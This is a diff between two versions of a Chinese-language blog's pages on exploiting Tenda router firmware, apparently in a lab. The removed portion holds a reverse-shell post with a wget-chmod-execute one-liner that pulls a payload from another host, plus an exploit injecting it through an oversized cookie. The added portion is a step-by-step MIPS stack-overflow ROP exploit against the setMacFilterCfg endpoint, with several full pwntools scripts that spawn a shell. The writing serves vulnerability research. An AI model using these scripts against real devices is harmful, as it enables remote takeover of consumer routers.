0x0005D72C  |  move $a0,$s1   |  jr    0x20+var_s24($sp)  |</span><br><span class="line">--------------------------------------------------------------</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/pasted-109.png" alt="upload successful"></p>
-<p>进入到路由器界面，输入命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+<p>这边我选择了第一个作为gadget2，也就是为自己买下了第二个坑，具体为什么坑，后面执行exp的时候再说。gadget2的内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000ABA4                 move    $a0, $s1</span><br><span class="line">.text:0000ABA8                 move    $t9, $s2</span><br><span class="line">.text:0000ABAC                 jalr    $t9 ; sub_10DB0</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/pasted-110.png" alt="upload successful"></p>
-<p>发现成功获得了shell。</p>
-<h4 id="使用一句话命令"><a href="#使用一句话命令" class="headerlink" title="使用一句话命令"></a>使用一句话命令</h4><p>在整合命令之前，介绍两个常用的linux命令连接的符号，一个是“；”，一个是“&amp;&amp;”。</p>
-<p>“；”的意思就是一次执行命令，不管前一个命令是否成功执行，都会进行下一个命令的执行；而“&amp;&amp;”命令则是在执行前一个命令成功的基础上，才会继续执行下一个命令，所以这里对一句话命令的构造为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.5.5:8000/payload.elf &amp;&amp; chmod +x * &amp;&amp; ./payload.elf</span><br></pre></td></tr></table></figure>
+<p>首先我们将exp写到覆盖到gadget1（scandir64）的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0x7f584320 - 0x60320#0x7f524000</span><br><span class="line">    sys_off = 0x60320 </span><br><span class="line">    rop1 = 0x13444</span><br><span class="line">    payload = &quot;\r&quot; +  &quot;A&quot; * 472 </span><br><span class="line">    payload += p32(libc_base + rop1)</span><br><span class="line">    url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">    data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;   </span><br><span class="line">    requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
 
-<h4 id="exp整合"><a href="#exp整合" class="headerlink" title="exp整合"></a>exp整合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">#cmd = &quot;/bin/sh&quot;</span><br><span class="line">cmd = &quot;wget http://192.168.5.5:8000/payload.elf &amp;&amp; chmod +x * &amp;&amp; ./payload.elf&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(&quot;./httpd&quot;)</span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0xff5d5000#0xff5c6000</span><br><span class="line">    system_addr = libc_base + libc.sym[&quot;system&quot;]</span><br><span class="line">    # print(hex(system_addr))</span><br><span class="line">    gadget1 = libc_base + 0x00018298</span><br><span class="line">    gadget2 = libc_base + 0x00040cb8</span><br><span class="line">    payload1 = &quot;A&quot;*444 +&quot;.png&quot; + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</span><br><span class="line"></span><br><span class="line">    url = &quot;http://192.168.5.5/goform/xxx&quot;</span><br><span class="line">    # print(payload1)</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+payload1&#125;</span><br><span class="line">    log.success(&quot;getshell&quot;)</span><br><span class="line">    log.success(&quot;reverse_tcp_shell&quot;)</span><br><span class="line">    ret = requests.get(url=url, cookies=cookie)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong libc base.&quot;)</span><br><span class="line"># print(put_got)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>进行动态调试，断点下载rop1处（0x7f524000+0x13444）查看是否成功跳转：</p>
+<p><img src="/images/pasted-148.png" alt="upload successful"></p>
+<p>发现成功跳转到了scandir64函数处，disassemble命令查看全部汇编指令，取出其中重要部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x7f537444 &lt;+484&gt;:	lw	ra,68(sp)</span><br><span class="line">0x7f537448 &lt;+488&gt;:	lw	s8,64(sp)</span><br><span class="line">0x7f53744c &lt;+492&gt;:	lw	s7,60(sp)</span><br><span class="line">0x7f537450 &lt;+496&gt;:	lw	s6,56(sp)</span><br><span class="line">0x7f537454 &lt;+500&gt;:	lw	s5,52(sp)</span><br><span class="line">0x7f537458 &lt;+504&gt;:	lw	s4,48(sp)</span><br><span class="line">0x7f53745c &lt;+508&gt;:	lw	s3,44(sp)</span><br><span class="line">0x7f537460 &lt;+512&gt;:	lw	s2,40(sp)</span><br><span class="line">0x7f537464 &lt;+516&gt;:	lw	s1,36(sp)</span><br><span class="line">0x7f537468 &lt;+520&gt;:	lw	s0,32(sp)</span><br><span class="line">0x7f53746c &lt;+524&gt;:	jr	ra</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h5 id="测试exp"><a href="#测试exp" class="headerlink" title="测试exp"></a>测试exp</h5><p>将路由器root目录下的payload.elf删除，执行exp：</p>
-<p><img src="/images/pasted-111.png" alt="upload successful"></p>
-<p>成功反弹shell。</p>
+<p>这里发现移动至寄存器中的sp均有偏移，分别为68、64……36、32，通过”x/x $sp + 68”命令查看内存中的值：</p>
+<p><img src="/images/pasted-149.png" alt="upload successful"></p>
+<p>目前这里是0，那么如果继续循行程序会将0传给$ra:</p>
+<p><img src="/images/pasted-151.png" alt="upload successful"></p>
+<p>发现传参成功，同理后续步骤会对$sXX寄存器进行赋值，有了这些信息之后，需要进行构建payload，需要覆盖到目标地址内容，但是注意，栈存储的顺序是倒序，所以需要先覆盖到$sp+32处，依次放入$s0、$s1、$s2、$s3、$s4、$s5、$s6、$s7、$s8、$ra应该存放的值，然而因为我利用的gadget2<br>的特殊性，所以要将$s1中放”/bin/sh”的地址，$s2中放system函数的地址。又因为在执行了跳转之后，sp指向的即为存放返回地址的下一个地址，所以只需要在payload中继续存放32个A即可，修改exp为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0x7f584320 - 0x60320#0x7f524000</span><br><span class="line">    sys_off = 0x60320 </span><br><span class="line">    rop1 = 0x13444</span><br><span class="line">    rop2 = 0xaba4</span><br><span class="line">    payload = &quot;\r&quot; +  &quot;A&quot; * 472 </span><br><span class="line">    payload += p32(libc_base + rop1)</span><br><span class="line">    payload += &quot;A&quot; * 32</span><br><span class="line">    payload += &quot;B&quot; * 4                                          #$s0</span><br><span class="line">    payload += p32(libc_base + next(libc.search(&quot;/bin/sh&quot;)))    #$s1</span><br><span class="line">    payload += p32(libc_base + sys_off)                         #$s2</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s3</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s4</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s5</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s6</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s7</span><br><span class="line">    payload += &quot;B&quot; * 4                                          #$fp</span><br><span class="line">    payload += p32(libc_base + rop2)                            #$ra</span><br><span class="line">    url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">    data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;   </span><br><span class="line">    requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>还是选择将断点下在了rop1处，进行动态调试：</p>
+<p><img src="/images/pasted-153.png" alt="upload successful"></p>
+<p>又发生了非预期的错误，但是仔细一看，是不是觉得这个错误很眼熟？这个错误就是在一开始我们在进行栈溢出偏移量覆盖是第一次出现的错误（覆盖”A” * 500），又停在了这边，那肯定是在覆盖时，覆盖了一些此前存在栈中的数据，导致了栈帧不平衡，开始继续动态调试寻找问题，在寻找问题之前首先分析一下可能出错的位置，首先之前在对返回地址进行覆盖之后是没有任何问题的，所以排除了在返回地址之前非法覆盖导致栈帧不平衡的问题，那么问题肯定是出现在了返回地址之后，一个地址一个地址进行排查，修改exp为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0x7f584320 - 0x60320#0x7f524000</span><br><span class="line">    sys_off = 0x60320 </span><br><span class="line">    rop1 = 0x13444</span><br><span class="line">    rop2 = 0xaba4</span><br><span class="line">    payload = &quot;\r&quot; +  &quot;A&quot; * 472 </span><br><span class="line">    payload += p32(libc_base + rop1)</span><br><span class="line">    payload += &quot;A&quot; * 4 * 1                    </span><br><span class="line">    url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">    data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;   </span><br><span class="line">    requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>进行调试：</p>
+<p><img src="/images/pasted-154.png" alt="upload successful"></p>
+<p>发现覆盖第一个地址之后，就报错了，看来第一个地址不可以覆盖，再看看报错的原因：</p>
+<p><img src="/images/pasted-155.png" alt="upload successful"></p>
+<p>发现这一步是对将$v0中的内容进行传参，但是$v0的地址已经被覆盖成了非法的地址，所以这里就报错了，那么我们将这里覆盖一个合法的栈地址，由于程序没有开aslr，那么就直接将溢出字符串的初始地址作为参数进行传递，修改exp为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0x7f584320 - 0x60320#0x7f524000</span><br><span class="line">    sys_off = 0x60320 </span><br><span class="line">    rop1 = 0x13444</span><br><span class="line">    rop2 = 0xaba4</span><br><span class="line">    payload = &quot;\r&quot; +  &quot;A&quot; * 472 </span><br><span class="line">    payload += p32(libc_base + rop1)</span><br><span class="line">    payload += p32(0x7fffeef4)</span><br><span class="line">    payload += &quot;A&quot; * 4 * 1                    </span><br><span class="line">    url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">    data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;   </span><br><span class="line">    requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
+<p>再次运行得到：</p>
+<p><img src="/images/pasted-156.png" alt="upload successful"></p>
+<p>到这里之后，不要慌，这里应该是gdb的一个bug，一开始我以为也是出现了另一个问题，因为没有成功跳转到rop1，不过我在进行调试的时候发现，这时候只需要在rop1的地址加上2就可以在gdb中正常进行，修改exp为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0x7f584320 - 0x60320#0x7f524000</span><br><span class="line">    sys_off = 0x60320 </span><br><span class="line">    rop1 = 0x13446</span><br><span class="line">    rop2 = 0xaba4</span><br><span class="line">    payload = &quot;\r&quot; +  &quot;A&quot; * 472 </span><br><span class="line">    payload += p32(libc_base + rop1)</span><br><span class="line">    payload += p32(0x7fffeef4)</span><br><span class="line">    payload += &quot;A&quot; * 4 * 7                   </span><br><span class="line">    url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">    data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;   </span><br><span class="line">    requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>动态调试：</p>
+<p><img src="/images/pasted-157.png" alt="upload successful"></p>
+<p>发现在gdb中可以正常运行至rop1处，那看到这里，可能会很疑惑，到底是看哪个地址呢？在gdb中运用disassemble命令查看该块的汇编指令，发现此时在汇编指令中，并没有箭头指向：</p>
+<p><img src="/images/pasted-158.png" alt="upload successful"></p>
+<p>所以我们应该以第一次的地址为准也就是rop1=0x13444。第一次出错可能是gdb的小bug，但是这里既然可以跳转至rop1了，说明栈帧都是平衡了，可以进行rop操作了，修改exp为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0x7f584320 - 0x60320#0x7f524000</span><br><span class="line">    sys_off = 0x60320 </span><br><span class="line">    rop1 = 0x13444</span><br><span class="line">    rop2 = 0xaba4</span><br><span class="line">    payload = &quot;\r&quot; +  &quot;A&quot; * 472 </span><br><span class="line">    payload += p32(libc_base + rop1)</span><br><span class="line">    payload += p32(0x7fffeef4)</span><br><span class="line">    payload += &quot;A&quot; * 28</span><br><span class="line">    payload += &quot;B&quot; * 4                                          #$s0</span><br><span class="line">    payload += p32(libc_base + next(libc.search(&quot;/bin/sh&quot;)))    #$s1</span><br><span class="line">    payload += p32(libc_base + sys_off)                         #$s2</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s3</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s4</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s5</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s6</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s7</span><br><span class="line">    payload += &quot;B&quot; * 4                                          #$fp</span><br><span class="line">    payload += p32(libc_base + rop2)                            #$ra   </span><br><span class="line">    url = &quot;http://192.168.5.4/goform/setMacFilterCfg&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">    data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;</span><br><span class="line">    requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>最终执行，断点依旧下载rop1处：</p>
+<p><img src="/images/pasted-159.png" alt="upload successful"></p>
+<p>rop1处寄存器都成功被覆盖，继续步入rop2中：</p>
+<p><img src="/images/pasted-160.png" alt="upload successful"></p>
+<p>发现rop2处的地址也覆盖得非常成功，继续si步入system函数：</p>
+<p><img src="/images/pasted-161.png" alt="upload successful"></p>
+<p>但是si一进去，就意识到了事情不对劲，$a0也变了，这样就不能执行system(“/bin/sh”)，具体为什么$a0会发生改变，这个我也不是很清楚，随后我更换了gadget2的跳转指令为jr的，即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00046860                 move    $a0, $s1</span><br><span class="line">.text:00046864                 addiu   $a1, $s0, 0x10</span><br><span class="line">.text:00046868                 move    $t9, $s2</span><br><span class="line">.text:0004686C                 lw      $ra, 0x18+var_sC($sp)</span><br><span class="line">.text:00046870                 lw      $s2, 0x18+var_s8($sp)</span><br><span class="line">.text:00046874                 lw      $s1, 0x18+var_s4($sp)</span><br><span class="line">.text:00046878                 lw      $s0, 0x18+var_s0($sp)</span><br><span class="line">.text:0004687C                 jr      $t9 ; xdr_u_long</span><br></pre></td></tr></table></figure>
+<p>万幸的是这个gadget2不需要对gadget1进行修改，直接跳转就行，修改exp为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0x7f584320 - 0x60320#0x7f524000</span><br><span class="line">    sys_off = 0x60320 </span><br><span class="line">    rop1 = 0x13444</span><br><span class="line">    rop2 = 0x46860</span><br><span class="line">    payload = &quot;\r&quot; +  &quot;A&quot; * 472 </span><br><span class="line">    payload += p32(libc_base + rop1)</span><br><span class="line">    payload += p32(0x7fffeef4)</span><br><span class="line">    payload += &quot;A&quot; * 28</span><br><span class="line">    payload += &quot;B&quot; * 4                                          #$s0</span><br><span class="line">    payload += p32(libc_base + next(libc.search(&quot;/bin/sh&quot;)))    #$s1</span><br><span class="line">    payload += p32(libc_base + sys_off)                         #$s2</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s3</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s4</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s5</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s6</span><br><span class="line">    payload += &#x27;B&#x27; * 4                                          #$s7</span><br><span class="line">    payload += &quot;B&quot; * 4                                          #$fp</span><br><span class="line">    payload += p32(libc_base + rop2)                            #$ra   </span><br><span class="line">    url = &quot;http://192.168.5.6/goform/setMacFilterCfg&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;</span><br><span class="line">    data = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: payload&#125;</span><br><span class="line">    requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>修改完之后，继续进行动态调试，断点下载rop2处：</p>
+<p><img src="/images/pasted-162.png" alt="upload successful"></p>
+<p>单步si调试至跳转处，发现程序一切正常：</p>
+<p><img src="/images/pasted-163.png" alt="upload successful"></p>
+<p>进入跳转：</p>
+<p><img src="/images/pasted-164.png" alt="upload successful"></p>
+<p>看到这里，长吁一口气，大功告成，自信地按下c：</p>
+<p><img src="/images/pasted-165.png" alt="upload successful"></p>
+<p>getshell成功！</p>
 
       
 
@@ -282,10 +455,6 @@
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">iot</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">reverse_shell</a>
         		</li>
       		
 		</ul>
@@ -352,7 +521,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/19/reverse-shell/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/27/%E5%AF%B9tenda-V15-03-06-42-mips-%E8%BF%9B%E8%A1%8Cgetshell/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -366,18 +535,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/09/22/tenda%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84getshll/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          iot_pwn_tenda(Tenda AC18 V15.03.05.19)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/09/16/iot-pwn-tenda/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">iot_pwn_tenda(Tenda AC15 15.03.1.16)</div>
+    <a href="/2021/09/23/%E8%BF%9C%E7%A8%8B%E5%AF%B9tenda%EF%BC%88V15-03-05-16-EN%EF%BC%89%E8%BF%9B%E8%A1%8Cgetshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">远程对tenda(V15.03.05.16_EN)进行getshell</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -405,7 +565,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="reverse-shell" data-title="对tenda getshell之后的reverse_shell" data-url="http://example.com/2021/09/19/reverse-shell/"></div>
